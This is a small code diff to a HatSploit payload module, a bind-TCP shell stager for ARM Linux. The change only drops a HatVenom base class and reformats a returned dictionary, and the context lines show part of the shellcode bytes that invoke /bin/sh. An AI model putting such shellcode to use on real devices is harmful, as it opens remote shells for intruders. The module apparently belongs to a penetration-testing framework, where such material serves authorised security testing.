@@ -8,7 +8,7 @@
 from hatsploit.lib.payload import Payload
 
 
-class HatSploitPayload(Payload, HatVenom):
+class HatSploitPayload(Payload):
     details = {
         'Category': "stager",
         'Name': "Linux armle Shell Bind TCP",
@@ -62,4 +62,6 @@ class HatSploitPayload(Payload, HatVenom):
             b"\x01\x01\x01\x01"
             b"\x2f\x62\x69\x6e"
             b"\x2f\x73\x68\x58"
-        ), {'bport': bind_port}
+        ), {
+            'bport': bind_port
+        }
